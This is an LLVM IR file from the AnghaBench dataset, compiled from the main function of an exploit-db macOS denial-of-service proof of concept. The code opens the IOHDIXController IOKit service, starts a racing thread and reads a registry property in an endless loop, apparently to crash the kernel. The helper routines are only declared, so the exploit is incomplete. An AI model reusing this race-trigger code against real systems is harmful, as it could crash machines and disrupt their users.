; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_39929.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_39929.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@lock = common dso_local global i32 0, align 4
@thread_func = common dso_local global i32 0, align 4
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"IOHDIXController\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"di-root-image-result\00", align 1
@kCFAllocatorDefault = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call i32 @OSSpinLockLock(i32* @lock)
  %12 = load i32, i32* @thread_func, align 4
  %13 = call i32 @pthread_create(i32* %7, i32* null, i32 %12, i32* null)
  %14 = load i32, i32* @kIOMasterPortDefault, align 4
  %15 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @IOServiceGetMatchingService(i32 %14, i32 %15)
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %8, align 4
  %19 = call i32 (...) @mach_task_self()
  %20 = call i32 @IOServiceOpen(i32 %18, i32 %19, i32 0, i32* %9)
  %21 = load i32, i32* %9, align 4
  %22 = call i32 @set_params(i32 %21)
  br label %23

23:                                               ; preds = %23, %2
  %24 = call i32 @OSSpinLockUnlock(i32* @lock)
  %25 = load i32, i32* %8, align 4
  %26 = call i32 @CFSTR(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %27 = load i32, i32* @kCFAllocatorDefault, align 4
  %28 = call i32 @IORegistryEntryCreateCFProperty(i32 %25, i32 %26, i32 %27, i32 0)
  store i32 %28, i32* %10, align 4
  br label %23
}

declare dso_local i32 @OSSpinLockLock(i32*) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @IOServiceOpen(i32, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @set_params(i32) #1

declare dso_local i32 @OSSpinLockUnlock(i32*) #1

declare dso_local i32 @IORegistryEntryCreateCFProperty(i32, i32, i32, i32) #1

declare dso_local i32 @CFSTR(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
